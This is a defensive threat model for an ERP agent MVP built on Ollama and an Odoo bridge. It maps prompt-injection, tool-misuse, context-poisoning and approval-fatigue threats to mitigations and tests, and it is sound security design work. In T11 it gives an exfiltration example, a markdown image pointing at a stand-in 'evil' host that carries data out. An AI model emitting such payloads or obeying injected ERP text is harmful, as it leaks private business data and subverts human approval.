# MVP threat model

The approved [ADR 0014](../adr/0014-mvp-remediation-boundaries.md) clarifies current artifact admission, credential/fact freshness, worker ownership, target checks and public text boundaries. Current evidence and unresolved live gates are recorded in the [remediation retest](../reviews/2026-10-07-mvp-remediation-retest.md).

**Date:** 2026-10-06. **Status:** accepted baseline; covers the ADR 0001 scope (local Pydantic AI + Ollama driver, Odoo 19 bridge, streaming overlay, BigQuery read templates). The generic control matrix lives in [research 04](../../research/04-enterprise-controls-and-roadmap.md). This document is narrower: it lists the threats this MVP's architecture actually exposes and the test that shows each mitigation works. Several mitigations are implemented; the [README](../../README.md) status and the latest [remediation retest](../reviews/2026-10-07-mvp-remediation-retest.md) say which (last checked 2026-10-14). T20–T22 are proposed with the execution IR (target architecture §6.4); T23–T24 are reserved for the data governance ADR.

## 1. Assets and trust boundaries

| Asset | Where |
|---|---|
| ERP business records and their integrity | Odoo sandbox (via bridge) |
| Approval authority | Kernel approvals + authenticated approver session |
| Odoo API key, BigQuery service identity | Operator secret store; adapter process only |
| Business data in context, evidence and analytics | Model context, PostgreSQL ledger, BigQuery |
| Integrity of the rule inventory and policy | Packaged domain resources, trusted policy module |

Trust boundaries: browser ↔ server API; server ↔ model runtime (Ollama); kernel ↔ driver; adapters ↔ Odoo / BigQuery; ERP data ↔ model context (data is untrusted content); deployment ↔ plugin artifacts.

The **lethal trifecta** test (private data + untrusted content + an outbound channel) applies. The MVP has private ERP data and untrusted ERP/CRM text. Outbound channels are limited to the UI rendering surface, BigQuery template parameters and the Odoo write commands. Each is constrained below.

## 2. Threats mapped to OWASP Top 10 for Agentic Applications (2026)

| ID | OWASP | Threat in this MVP | Mitigation | Test |
|---|---|---|---|---|
| T1 | ASI01 Agent goal hijack | Text in a product description, partner note or CRM lead tells the model to choose an unapproved offer or another supplier | Tool set fixed per run; validation rules independent of model text (ADR 0009); approval diff highlights material fields; read results marked as data in prompts | Injection fixtures in partner/product/lead fields; expected outcome is blocked or unchanged proposal (AgentDojo-style). Planned: Phase 3 Task 3d.2 (injection fixtures, `test_untrusted_values_are_fenced`, `test_fence_cannot_be_closed_from_inside`) and Task 3d.5 (`test_injected_fixture_run_proposes_the_same_action`); ADR 0032 |
| T2 | ASI02 Tool misuse | Model calls an allowed tool with harmful arguments (wrong company, huge quantity) | Gateway authorization + domain rules + approval; no generic `execute` (ADR 0005); scope checked by policy | Out-of-scope company ID and over-budget fixtures |
| T3 | ASI03 Identity & privilege abuse | The bridge user holds broad Odoo rights; an approver identity is spoofed via the UI host | Dedicated minimal Odoo user and company rules; identity only from authenticated server session; `HostContext` hints are resolved by the server or dropped | Request with forged body identity; bridge call outside allowed company |
| T4 | ASI04 Supply chain | A compromised dependency or plugin artifact | Locked dependencies; admission against an artifact inventory with digests; no runtime install | Tampered wheel digest rejected at startup |
| T5 | ASI05 Unexpected code execution | Model output reaching an eval, SQL or shell path | No code-execution tools; BigQuery templates are parameterized only; no DDL/DML/scripts | Template rejects injected SQL fragment as parameter value |
| T6 | ASI06 Memory & context poisoning | A persisted continuation or evidence is reused as instruction in later runs | No cross-run memory in MVP; continuation is per run and versioned; evidence is never fed back as instructions | New run does not load prior run text. Planned: a citation may resolve only to this run's evidence, Phase 3 Task 3e.1 (`test_citation_to_another_run_is_unresolved`); ADR 0033 |
| T7 | ASI07 Insecure inter-agent communication | — (single agent) | Not applicable in MVP; re-assess before multi-agent or A2A | — |
| T8 | ASI08 Cascading failures | Odoo timeout leads to retry storms or duplicate POs | `UNKNOWN` + reconciliation; no auto-retry of writes; per-connection writer lock; budgets | Lost-response fault injection (ADR 0005) |
| T9 | ASI09 Human-agent trust exploitation | Persuasive model text makes the approver accept a bad proposal (approval fatigue) | Approval card renders the canonical proposal and rule findings, not model prose; model text visually separated and labelled | UI test: approval card content equals the digest input (ADR 0006) |
| T10 | ASI10 Rogue agents | Model loops, ignores stop, or exceeds budgets | Kernel-enforced budgets; cancellation; run cannot raise its own budget | Budget exhaustion and cancel tests |

## 3. Additional MVP-specific threats

| ID | Threat | Mitigation | Test |
|---|---|---|---|
| T11 | **Exfiltration via rendered output.** Markdown image or link in model text carries data to an external URL (EchoLeak pattern) | Overlay renders model text as plain or sanitized markdown with no remote image loading; strict CSP (`img-src 'self'`, `connect-src` own API); links require click and show the full URL | Model text with `![x](https://evil/?d=...)` produces no network request |
| T12 | **Reasoning leakage** into storage or telemetry | ADR 0004 hygiene; ADR 0008 content capture off | Thinking-enabled run leaves no reasoning in stores or traces |
| T13 | **Cross-border transfer.** ERP data with personal data is copied to BigQuery in a non-Vietnam region | Synthetic data only until data owner, region and legal basis are recorded (Vietnam PDPL 91/2025/QH15 effective 2026-01-01 requires a cross-border transfer impact assessment); templates read only approved datasets | Configuration check refuses non-allowlisted project, dataset or region |
| T14 | **Wrong target environment.** Commands hit `odoo-bench` or a non-sandbox database | Sandbox marker plus explicit URL, database and company allowlist checked at startup and before each write | Startup against unmarked database fails |
| T15 | **CSRF or cross-origin command** from an overlay embedded on another application's page | Same-origin with server-side CSRF validation, or explicit origin allowlist plus token exchange; no secrets in URLs or postMessage | Cross-origin POST without valid token rejected |
| T16 | **Ledger store co-located with Odoo DB** | Separate PostgreSQL database and role for e-agent | Profile validation rejects Odoo DB URL |
| T18 | **Credential exposure via admin surfaces** (secret echoed in API, logs or evidence; OAuth callback hijack) | Write-only secret fields; `SecretStore` refs only; RFC 9700 OAuth (PKCE, `state`, exact redirect); `integration_admin` role with step-up; admin APIs never agent tools (ADR 0012) | Canary-secret scan; OAuth negative tests |
| T19 | **Confused deputy / credential misuse**: another user's delegated connection, the approver's credential, or a shared connection silently substituted for a write | User connections usable only by their owner; credential subject in the approval digest; write fallback to shared credentials forbidden; JIT connect only on user gesture (ADR 0013) | Cross-user connection test; credential change after approval → stale |
| T17 | **Prompt/tool-schema drift** mid-run | Tool set and schema digests pinned in run record; mismatch on resume blocks | Change schema between approval and resume → blocked |
| T20 | **Plan approval fatigue.** One approval covers several writes; the approver skims a long plan and approves a harmful step inside it | The plan presentation lists every step with arguments, lineage sources, the highest declared risk and irreversible steps (ADRs 0024, 0029); multi-write plans refused in live profiles until the plan-approval UI exists; write count capped by the task definition | A plan with a `destructive` step shows it in the presentation; a live profile with `max_admitted_writes > 1` fails startup |
| T21 | **Step divergence and lineage substitution.** A later step executes with values the approver did not see: a model- or receipt-supplied value, a changed fact, or a placeholder resolved to an unexpected record | The plan digest binds placeholders and their single rule (copy from the earlier step's verified outcome); facts, policy, connection, credential and TTL revalidated before every step; resolved values recorded before reservation; deviation stops the plan (ADR 0025) | A lineage value outside the verified outcome stops the plan before reservation; a stale fact before step 2 stops it |
| T23 | **Personal data egress to a hosted model.** Observations with partner, employee or contact data are forwarded to a hosted model route without a declared processing basis | Field classes declared beside capability schemas (`data_classes`; unmarked = `personal`); route `data_boundary`; `local_only`; `data_processing` declaration required for a hosted route; ContextAssembler masks and records drops; interim startup refusal (ADR 0030) | Hosted route without `data_processing` fails startup; a `personal` value to an undeclared hosted route appears in `ContextPack.dropped`, not in the prompt. Planned: Phase 3 Task 3b.1 (`test_hosted_route_without_data_processing_fails_startup`), Task 3b.2 (`test_pinned_off_run_on_undeclared_hosted_route_fails_closed`, the per-call route check) and Task 3d.4 (`test_masked_value_absent_from_model_request`); ADRs 0030, 0032 |
| T24 | **Evidence export as an exfiltration channel.** Any tenant member exports full run evidence, including business payloads and personal data | Export authorization by run visibility (target §13.2 rule 4) before Phase 5 live evaluation; class-aware export masks personal values for non-auditors; access log in Phase 7 (ADR 0030, C17) | A non-auditor's export masks `personal` values; a member outside the run's visibility gets 404 |
| T22 | **Benchmark auto-approve reaches production.** A benchmark-only profile flag that auto-approves writes is enabled against a live ERP, or covers high-risk writes | The flag is refused with `environment: live` at startup; it covers only `read` and `write_low` steps with explicit declarations; `/health/ready` and evidence report it; auto-approvals are recorded with the system actor (ADR 0024) | Startup with the flag and `environment: live` fails; a `write_high` step under the flag waits for a human |

## 4. Residual risks accepted for MVP

- Local single-operator identity mapping is not production authentication.
- Injection can still steer *arguments within allowed bounds*, such as which of two approved offers is chosen. Rules and approval limit the damage but do not eliminate it.
- The local Ollama runtime and its model files are trusted. Model provenance is recorded but not cryptographically verified.
- No tamper-evident audit log (hash chaining, WORM storage) in the MVP; evidence integrity relies on database access control.

## 5. References

- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [Design Patterns for Securing LLM Agents against Prompt Injections](https://arxiv.org/abs/2506.08837); [CaMeL](https://arxiv.org/abs/2503.18813); [AgentDojo](https://arxiv.org/abs/2406.13352)
- [MCP security best practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices) (relevant if MCP is added later)
- Vietnam PDPL overview: [Baker McKenzie](https://connectontech.bakermckenzie.com/vietnam-decoding-vietnams-pdp-law-gdpr-inspired-rules-with-local-twists/)
